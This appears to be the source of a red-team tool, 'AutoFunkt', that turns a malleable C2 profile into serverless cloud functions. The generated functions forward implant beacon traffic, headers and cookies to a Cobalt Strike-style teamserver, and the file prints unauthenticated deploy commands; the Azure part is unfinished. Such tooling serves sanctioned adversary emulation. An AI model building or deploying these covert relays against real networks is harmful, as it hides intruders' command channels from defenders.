import re
from time import sleep
import os
import shutil
import json
import argparse
from mpp import MalleableProfile
# font colors:
green = "\033[32m"
red   = '\033[31m'
blue  = '\033[34m'
white = '\033[37m'

### Define a command line argument to load the malleable c2 profile
# Create argument parser
parser = argparse.ArgumentParser(description='Load a malleable c2 profile')
# Add positional argument for the profile path
parser.add_argument('profile_path', help='Path to the malleable c2 profile')
parser.add_argument('teamserver_url', help='Teamserver URL')
# Parse arguments
args = parser.parse_args()
profile_path = args.profile_path
teamserverURL = args.teamserver_url

############################################
mp = MalleableProfile(profile_path)
############################################

def get_http_get_uri():
    # Get the http_get_uri from the profile
    http_get_uri = mp.http_get.uri.value
    if ' ' in http_get_uri:
        print(f"{red}[X] ERROR: MULTIPLE URI STRINGS DETECTED IN {green}'http-get'{red} BLOCK")
        print(f"{red}[X] EDIT THE LINE {green}\"set uri {http_get_uri};\"{red} IN {green}{profile_path}{red} TO CONTAIN A SINGLE URI")
        exit() 
    else:
        return http_get_uri

def get_http_post_uri():
    # Get the http_post_uri from the profile
    http_post_uri = mp.http_post.uri.value
    print(http_post_uri)
    if ' ' in http_post_uri:
        print(f"{red}[X] ERROR: MULTIPLE URI STRINGS DETECTED IN {green}'http-post'{red} BLOCK")
        print(f"{red}[X] EDIT THE LINE {green}\"set uri {http_post_uri};\"{red} IN {green}{profile_path}{red} TO CONTAIN A SINGLE URI")
        exit() 
    else:
        return http_post_uri

def generate_gcp_function(uri_value, output_dir, teamserver_url):
    # Create the function name
    uri = uri_value
    func_name = f"{uri_value.replace('/', '')}"
    # Create the function directory
    func_dir = os.path.join(output_dir, func_name)
    # Create the function directory if it doesn't exist
    if not os.path.exists(func_dir):
        os.makedirs(func_dir)
    # create the requirements.txt file for the function
    with open(os.path.join(func_dir, 'requirements.txt'), 'w') as r:
        r.write(f"""
requests
        """)
    # Create the main.py file for the function
    with open(os.path.join(func_dir, 'main.py'), 'w') as f:
        f.write(f"""
from flask import make_response
import functions_framework
import requests

@functions_framework.http
def {func_name}(request):
    teamserver_url = '{teamserver_url}/' # this has to end in a '/' (slash)
    beacon_endpoint = "{uri}"          # this is the bit after the first '/'

    post_url = teamserver_url + beacon_endpoint
    header_dict = dict(request.headers)
    cookies_dict = dict(request.cookies)
    post_data = request.get_data()

    res = requests.post(
        url=post_url,
        data=post_data,
        headers=header_dict,
        cookies=cookies_dict
    )
    response = make_response(res.content)
    return response
""")

    print(f"{green}[+] Deploy '{func_name}' with: gcloud functions deploy {func_name} --runtime python39 --trigger-http --allow-unauthenticated")

#####################################3
# TODO: FIGURE THIS OUT . Reread chris's blog and figure out what variables are needed
def generate_azure_function(directory, teamserver_url, get_endpoint, post_endpoint):

    # create the azure directory
    azure_dir = os.path.join(directory)
    os.makedirs(azure_dir)

    # make the host.json, proxies.json, and requirements.txt files
    host_json = """{
        "version": "2.0"
    }"""
    proxies_json = """{
        "$schema": "http://json.schemastore.org/proxies",
        "proxies": {}
    }"""
    requirements_txt = """azure-functions
    # Required for the Azure Functions runtime
    azure-functions-worker"""

    with open(os.path.join(azure_dir, "host.json"), "w") as f:
        f.write(host_json)
    with open(os.path.join(azure_dir, "proxies.json"), "w") as f:
        f.write(proxies_json)
    with open(os.path.join(azure_dir, "requirements.txt"), "w") as f:
        f.write(requirements_txt)


################################################################
    # make the __init__.py files for the functions 
    get_init = f"""

import logging
import urllib.parse
import urllib.request
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    #incoming_request = urlparse(req.url)
    #dict(req.headers).items()
    header_dict = {{}}
    get_url = '{teamserver_url + "/" + get_endpoint}'
    for key, value in dict(req.headers).items():
        header_dict.update({{key : value}})

    request = urllib.request.Request(get_url, headers=header_dict)
    with urllib.request.urlopen(request) as response:
        html = response.read()
    return func.HttpResponse(html)
    """
    ##########################################################
    post_init = f"""
import logging
import ssl
import urllib.parse
import urllib.request
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    #incoming_request = urlparse(req.url)
    #dict(req.headers).items()
    header_dict = {{}}
    get_url = '{teamserver_url + "/" + post_endpoint}'
    for key, value in dict(req.headers).items():
        header_dict.update({{key : value}})
    #ssl._create_default_https_context = ssl._create_unverified_context
    post_data = req.get_body()
    request = urllib.request.Request(get_url, data=post_data, headers=header_dict)
    with urllib.request.urlopen(request) as response:
        html = response.read()
    return func.HttpResponse(html)
    """
    func_json = """

    """

    sample_dat = """

    """
    # make the directories for the functions
    for func_dir in ["get", "post"]:
        func_dir_path = os.path.join(azure_dir, func_dir)
        os.makedirs(func_dir_path)

    get_path = os.path.join(azure_dir, "get")  
    post_path = os.path.join(azure_dir, "post") 

    # create the __init__.py files
    init_file_path = os.path.join(get_path, "__init__.py")
    with open(init_file_path, "w") as f:
        f.write(get_init)

    init_file_path = os.path.join(post_path, "__init__.py")
    with open(init_file_path, "w") as f:
        f.write(post_init)

    # create the function.json file
    function_file_path = os.path.join(get_path, "function.json")
    with open(function_file_path, "w") as f:
        f.write(func_json)

    function_file_path = os.path.join(post_path, "function.json")
    with open(function_file_path, "w") as f:
        f.write(func_json)

    # create the sample.dat file
    sample_file_path = os.path.join(get_path, "sample.dat")
    with open(sample_file_path, "w") as f:
        f.write(sample_dat)

    sample_file_path = os.path.join(post_path, "sample.dat")
    with open(sample_file_path, "w") as f:
        f.write(sample_dat)

################################################################################
def print_banner():
    print(f"""{blue}
Presenting... {blue}
""")
    sleep(0.1)
    print(f"""{white}
       d8888          888             8888888888                888      888          
      d88888          888             888                       888      888          
     d88P888          888             888                       888      888          
    d88P 888 888  888 888888  .d88b.  8888888 888  888 88888b.  888  888 888888       
   d88P  888 888  888 888    d88""88b 888     888  888 888 "88b 888 .88P 888          
  d88P   888 888  888 888    888  888 888     888  888 888  888 888888K  888          
 d8888888888 Y88b 888 Y88b.  Y88..88P 888     Y88b 888 888  888 888 "88b Y88b.        
d88P     888  "Y88888  "Y888  "Y88P"  888      "Y88888 888  888 888  888  "Y888   
""")
    sleep(0.1)
    print(f"""\t\tmalleable c2 => serverless cloud functions
    
    """)
    sleep(0.1)
    print(f"{blue}From your friends at...")
    sleep(0.1)
    print(f""" 
{blue}    ,---. .---.  ,---.  _______.-.   .-..-. .-. .---.  ,---.  _______ .-. .-. 
{blue}    | .-'/ .-. ) | .-.\|__   __|\ \_/ )/|  \| |/ .-. ) | .-.\|__   __|| | | | 
{blue}    | `-.| | |(_)| `-'/  )| |    \   (_)|   | || | |(_)| `-'/  )| |   | `-' | 
{blue}    | .-'| | | | |   (  (_) |     ) (   | |\  || | | | |   (  (_) |   | .-. | 
{blue}    | |  \ `-' / | |\ \   | |     | |   | | |)|\ `-' / | |\ \   | |   | | |)| 
{blue}    )\|   )---'  |_| \)\  `-'    /(_|   /(  (_) )---'  |_| \)\  `-'   /(  (_) 
{blue}   (__)  (_)         (__)       (__)   (__)    (_)         (__)      (__)     
{blue}   ======================================================= Security ========={blue}""")
    sleep(0.1)
    print(f"""
\t\t|| written by {red}Adam Rose {blue}(https://github.com/{red}a-3-r{blue})      
\t\t|| https://{red}fortynorthsecurity{blue}.com                        
\t\t|| https://github.com/fortynorthsecurity              
    
    """)
################################################################################

def runner():
    print_banner()
    generate_gcp_function(get_http_get_uri(), 'output', teamserverURL)
    generate_gcp_function(get_http_post_uri(), 'output', teamserverURL)

runner()

